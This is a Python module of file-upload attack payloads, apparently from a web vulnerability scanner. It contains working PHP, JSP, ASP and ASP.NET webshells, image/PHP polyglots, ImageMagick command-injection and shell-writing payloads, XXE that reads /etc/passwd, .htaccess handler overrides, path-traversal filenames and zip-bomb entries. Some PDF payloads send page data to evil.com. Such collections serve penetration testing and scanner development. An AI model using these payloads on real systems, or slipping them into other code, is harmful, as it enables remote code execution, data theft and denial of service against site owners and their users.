"""
File Upload Security Payloads

Payloads for file upload vulnerability testing including:
- MIME type spoofing
- Double extension attacks
- Null byte injection
- Webshell uploads
- XXE via file upload
- Large file DoS
"""

# MIME type spoofing payloads
MIME_SPOOF = [
    {
        "name": "php_as_jpeg",
        "filename": "exploit.php",
        "content_type": "image/jpeg",
        "description": "PHP file disguised as JPEG",
    },
    {
        "name": "jsp_as_png",
        "filename": "exploit.jsp",
        "content_type": "image/png",
        "description": "JSP file disguised as PNG",
    },
    {
        "name": "asp_as_gif",
        "filename": "exploit.asp",
        "content_type": "image/gif",
        "description": "ASP file disguised as GIF",
    },
    {
        "name": "jspx_as_jpg",
        "filename": "webshell.jspx",
        "content_type": "image/jpg",
        "description": "JSPX file disguised as JPG",
    },
    {
        "name": "phar_as_jpeg",
        "filename": "test.phar",
        "content_type": "image/jpeg",
        "description": "PHAR file disguised as JPEG (deserialization)",
    },
    {
        "name": "php5_as_png",
        "filename": "exploit.php5",
        "content_type": "image/png",
        "description": "PHP5 file disguised as PNG",
    },
]

# Double extension attacks
DOUBLE_EXTENSION = [
    {
        "name": "php_jpg",
        "filename": "shell.php.jpg",
        "description": "Double extension .php.jpg",
    },
    {
        "name": "jsp_png",
        "filename": "exploit.jsp.png",
        "description": "Double extension .jsp.png",
    },
    {
        "name": "asp_gif",
        "filename": "shell.asp.gif",
        "description": "Double extension .asp.gif",
    },
    {
        "name": "php5_jpg",
        "filename": "shell.php5.jpg",
        "description": "Double extension .php5.jpg",
    },
    {
        "name": "phtml_jpg",
        "filename": "shell.phtml.jpg",
        "description": "Double extension .phtml.jpg",
    },
    {
        "name": "php3_jpg",
        "filename": "exploit.php3",
        "description": "Double extension .php3.jpg",
    },
]

# Null byte injection
NULL_BYTE_PAYLOADS = [
    {
        "name": "php_null_jpg",
        "filename": "exploit.php\x00.jpg",
        "description": "Null byte between .php and .jpg",
    },
    {
        "name": "jsp_null_png",
        "filename": "shell.jsp\x00.png",
        "description": "Null byte between .jsp and .png",
    },
    {
        "name": "asp_null_gif",
        "filename": "exploit.asp\x00.gif",
        "description": "Null byte between .asp and .gif",
    },
]

# Webshell upload payloads
WEBSHELL_PAYLOADS = [
    {
        "name": "php_webshell",
        "filename": "shell.php",
        "content": "<?php system($_GET['cmd']); ?>",
        "description": "Simple PHP webshell",
    },
    {
        "name": "php_b64_webshell",
        "filename": "b64.php",
        "content": "<?php eval(base64_decode($_POST['code'])); ?>",
        "description": "Base64 PHP webshell",
    },
    {
        "name": "jsp_webshell",
        "filename": "shell.jsp",
        "content": "<%@ page import='java.io.*' %><%= Runtime.getRuntime().exec(request.getParameter('cmd')) %>",
        "description": "JSP webshell",
    },
    {
        "name": "asp_webshell",
        "filename": "shell.asp",
        "content": "<% response.write(Request('cmd')) %>",
        "description": "ASP webshell",
    },
    {
        "name": "aspx_webshell",
        "filename": "shell.aspx",
        "content": "<%@ Page Language='C#' %><% System.Diagnostics.Process.Start(Request['cmd']); %>",
        "description": "ASP.NET webshell",
    },
]

# XXE via file upload
FILE_UPLOAD_XXE = [
    {
        "name": "svg_xxe",
        "filename": "evil.svg",
        "content": """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>""",
        "description": "XXE via SVG upload",
    },
    {
        "name": "docx_xxe",
        "filename": "evil.docx",
        "content_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        "description": "XXE via DOCX upload",
    },
    {
        "name": "xlsx_xxe",
        "filename": "evil.xlsx",
        "content_type": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        "description": "XXE via XLSX upload",
    },
    {
        "name": "pptx_xxe",
        "filename": "evil.pptx",
        "content_type": "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        "description": "XXE via PPTX upload",
    },
]

# Large file DoS payloads
LARGE_FILE_DOS = [
    {
        "name": "large_upload",
        "filename": "large.dat",
        "size_mb": 100,
        "description": "Large file upload DoS (100MB)",
    },
    {
        "name": "huge_upload",
        "filename": "huge.dat",
        "size_mb": 1000,
        "description": "Huge file upload DoS (1GB)",
    },
    {
        "name": "zip_bomb",
        "filename": "bomb.zip",
        "compression_ratio": "10000:1",
        "description": "ZIP bomb DoS attack",
    },
]

# Sensitive file uploads
SENSITIVE_FILE_NAMES = [
    ".htaccess",
    ".htpasswd",
    "web.config",
    "php.ini",
    ".user.ini",
    ".env",
    "config.php",
    "database.yml",
    "secrets.json",
    "id_rsa",
    "authorized_keys",
    ".ssh/id_rsa.pub",
]

# Executable file extensions
EXECUTABLE_EXTENSIONS = [
    ".php",
    ".php5",
    ".phtml",
    ".asp",
    ".aspx",
    ".jsp",
    ".jspx",
    ".sh",
    ".cgi",
    ".pl",
    ".py",
    ".rb",
    ".phar",
    ".jar",
    ".war",
]

# Image extensions commonly used for bypass
IMAGE_EXTENSIONS = [
    ".jpg",
    ".jpeg",
    ".png",
    ".gif",
    ".bmp",
    ".tiff",
    ".svg",
    ".ico",
]

# File upload vulnerability indicators
UPLOAD_VULN_INDICATORS = [
    "file uploaded successfully",
    "upload complete",
    "saved to",
    "stored at",
    "file path:",
    "upload directory:",
    "filename:",
]

# Upload field names
UPLOAD_FIELD_NAMES = [
    "file",
    "upload",
    "document",
    "image",
    "avatar",
    "profile_pic",
    "photo",
    "attachment",
    "media",
    "userfile",
]

# Polyglot file payloads (files that are valid in multiple formats)
POLYGLOT_FILES = [
    {
        "name": "gif_js_polyglot",
        "filename": "polyglot.gif",
        "content": b"GIF89a/*<script>alert(1)</script>*/=1;",
        "description": "GIF/JavaScript polyglot",
        "valid_as": ["image/gif", "application/javascript"],
    },
    {
        "name": "jpeg_php_polyglot",
        "filename": "polyglot.php.jpg",
        "content": b"\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>",
        "description": "JPEG/PHP polyglot with valid JPEG header",
        "valid_as": ["image/jpeg", "application/x-php"],
    },
    {
        "name": "png_html_polyglot",
        "filename": "polyglot.png",
        "content": b"\x89PNG\r\n\x1a\n<html><body><script>alert(1)</script></body></html>",
        "description": "PNG/HTML polyglot",
        "valid_as": ["image/png", "text/html"],
    },
    {
        "name": "pdf_js_polyglot",
        "filename": "polyglot.pdf",
        "content": b"%PDF-1.4\n1 0 obj<</Pages 2 0 R>>endobj/*<script>alert(1)</script>*/",
        "description": "PDF/JavaScript polyglot",
        "valid_as": ["application/pdf", "application/javascript"],
    },
    {
        "name": "bmp_html_polyglot",
        "filename": "polyglot.bmp",
        "content": b"BM<html><body onload=alert(1)>",
        "description": "BMP/HTML polyglot",
        "valid_as": ["image/bmp", "text/html"],
    },
]

# ImageMagick exploitation (ImageTragick CVE-2016-3714 and related)
IMAGEMAGICK_EXPLOITS = [
    {
        "name": "imagemagick_mvg_rce",
        "filename": "exploit.mvg",
        "content": """push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls "-la)'
pop graphic-context""",
        "description": "ImageMagick MVG RCE (CVE-2016-3714)",
    },
    {
        "name": "imagemagick_svg_rce",
        "filename": "exploit.svg",
        "content": """<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640px" height="480px" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://example.com/image.jpg&quot;|ls &quot;-la" x="0" y="0" height="640px" width="480px"/>
</svg>""",
        "description": "ImageMagick SVG RCE",
    },
    {
        "name": "imagemagick_msl_rce",
        "filename": "exploit.msl",
        "content": """<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php system($_GET['cmd']); ?&gt;" />
<write filename="/var/www/html/shell.php" />
</image>""",
        "description": "ImageMagick MSL file write",
    },
    {
        "name": "imagemagick_ephemeral",
        "filename": "exploit.png",
        "content": b"\x89PNG|ls -la",
        "description": "ImageMagick ephemeral protocol abuse",
    },
    {
        "name": "imagemagick_label",
        "filename": "exploit.gif",
        "content": b"GIF89a\x01\x00\x01\x00\x00\xff\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;label:@/etc/passwd",
        "description": "ImageMagick label: protocol LFI",
    },
]

# PDF with embedded JavaScript
PDF_JAVASCRIPT = [
    {
        "name": "pdf_alert_js",
        "filename": "js_alert.pdf",
        "content": """%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction 3 0 R>>endobj
2 0 obj<</Type/Pages/Kids[4 0 R]/Count 1>>endobj
3 0 obj<</S/JavaScript/JS(app.alert('XSS'))>>endobj
4 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj
xref
0 5
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000104 00000 n
0000000157 00000 n
trailer<</Size 5/Root 1 0 R>>
startxref
227
%%EOF""",
        "description": "PDF with JavaScript alert",
    },
    {
        "name": "pdf_external_js",
        "filename": "external_js.pdf",
        "content": """%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction<</S/JavaScript/JS(app.launchURL('http://evil.com/steal?d='+this.URL))>>>>endobj
2 0 obj<</Type/Pages/Count 0>>endobj
trailer<</Root 1 0 R>>""",
        "description": "PDF with external URL call",
    },
    {
        "name": "pdf_form_submit",
        "filename": "form_submit.pdf",
        "content": """%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R/AcroForm<</Fields[3 0 R]/XFA 4 0 R>>>>endobj
2 0 obj<</Type/Pages/Count 0>>endobj
3 0 obj<</T(data)/V(stolen)/AA<</F<</S/SubmitForm/F(http://evil.com/collect)>>>>>>endobj
4 0 obj<</Length 100>>stream
<?xml version="1.0"?><xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"></xdp:xdp>
endstream endobj
trailer<</Root 1 0 R>>""",
        "description": "PDF with form auto-submit",
    },
]

# SVG with embedded scripts
SVG_XSS_PAYLOADS = [
    {
        "name": "svg_script_tag",
        "filename": "xss.svg",
        "content": """<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
<script type="text/javascript">alert('XSS')</script>
</svg>""",
        "description": "SVG with script tag and onload",
    },
    {
        "name": "svg_foreignobject",
        "filename": "foreignobject.svg",
        "content": """<svg xmlns="http://www.w3.org/2000/svg">
<foreignObject><body xmlns="http://www.w3.org/1999/xhtml">
<img src=x onerror=alert(1)/>
</body></foreignObject>
</svg>""",
        "description": "SVG with foreignObject XSS",
    },
    {
        "name": "svg_animate",
        "filename": "animate.svg",
        "content": """<svg xmlns="http://www.w3.org/2000/svg">
<animate onbegin="alert(1)" attributeName="x"/>
</svg>""",
        "description": "SVG animate event XSS",
    },
    {
        "name": "svg_set",
        "filename": "set.svg",
        "content": """<svg xmlns="http://www.w3.org/2000/svg">
<set onbegin="alert(1)" attributeName="x"/>
</svg>""",
        "description": "SVG set element XSS",
    },
    {
        "name": "svg_use_external",
        "filename": "use.svg",
        "content": """<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<use xlink:href="http://evil.com/xss.svg#payload"/>
</svg>""",
        "description": "SVG use external reference",
    },
]

# .htaccess upload payloads
HTACCESS_PAYLOADS = [
    {
        "name": "htaccess_php_handler",
        "filename": ".htaccess",
        "content": "AddHandler application/x-httpd-php .jpg",
        "description": ".htaccess to execute .jpg as PHP",
    },
    {
        "name": "htaccess_php_engine",
        "filename": ".htaccess",
        "content": """<FilesMatch "\\.jpg$">
SetHandler application/x-httpd-php
</FilesMatch>""",
        "description": ".htaccess PHP engine for .jpg",
    },
    {
        "name": "htaccess_cgi",
        "filename": ".htaccess",
        "content": """Options +ExecCGI
AddHandler cgi-script .jpg""",
        "description": ".htaccess CGI execution",
    },
    {
        "name": "htaccess_ssi",
        "filename": ".htaccess",
        "content": """Options +Includes
AddHandler server-parsed .jpg""",
        "description": ".htaccess SSI for images",
    },
]

# Case sensitivity bypass payloads
CASE_BYPASS = [
    {
        "name": "uppercase_ext",
        "filename": "shell.PHP",
        "description": "Uppercase extension bypass",
    },
    {
        "name": "mixed_case_ext",
        "filename": "shell.pHp",
        "description": "Mixed case extension bypass",
    },
    {
        "name": "alternate_ext_php",
        "filename": "shell.php7",
        "description": "PHP7 extension",
    },
    {
        "name": "alternate_ext_phar",
        "filename": "shell.phar.jpg",
        "description": "PHAR extension bypass",
    },
    {
        "name": "htaccess_override",
        "filename": "shell.php.xxxjpg",
        "description": "Random extension that might be ignored",
    },
]

# Filename manipulation payloads
FILENAME_MANIPULATION = [
    {
        "name": "path_traversal_upload",
        "filename": "../../../var/www/html/shell.php",
        "description": "Path traversal in filename",
    },
    {
        "name": "unicode_filename",
        "filename": "shell\u202ephp.jpg",
        "description": "Unicode RLO character in filename",
    },
    {
        "name": "long_filename",
        "filename": "a" * 255 + ".php",
        "description": "Very long filename",
    },
    {
        "name": "special_chars",
        "filename": "shell;.php",
        "description": "Semicolon in filename",
    },
    {
        "name": "space_extension",
        "filename": "shell.php ",
        "description": "Trailing space in extension",
    },
    {
        "name": "dot_extension",
        "filename": "shell.php.",
        "description": "Trailing dot in extension",
    },
    {
        "name": "colons_windows",
        "filename": "shell.php::$DATA",
        "description": "Windows ADS bypass",
    },
]

# Magic bytes for file type validation bypass
MAGIC_BYTES = {
    "gif": b"GIF89a",
    "gif87": b"GIF87a",
    "jpeg": b"\xff\xd8\xff\xe0",
    "png": b"\x89PNG\r\n\x1a\n",
    "bmp": b"BM",
    "pdf": b"%PDF-",
    "zip": b"PK\x03\x04",
    "rar": b"Rar!\x1a\x07",
    "gzip": b"\x1f\x8b",
    "tar": b"ustar",
    "exe": b"MZ",
    "elf": b"\x7fELF",
}

# Combined payload list for easy iteration
ALL_FILE_UPLOAD_PAYLOADS = (
    MIME_SPOOF +
    DOUBLE_EXTENSION +
    NULL_BYTE_PAYLOADS +
    WEBSHELL_PAYLOADS +
    FILE_UPLOAD_XXE +
    LARGE_FILE_DOS +
    POLYGLOT_FILES +
    IMAGEMAGICK_EXPLOITS +
    PDF_JAVASCRIPT +
    SVG_XSS_PAYLOADS +
    HTACCESS_PAYLOADS +
    CASE_BYPASS +
    FILENAME_MANIPULATION
)
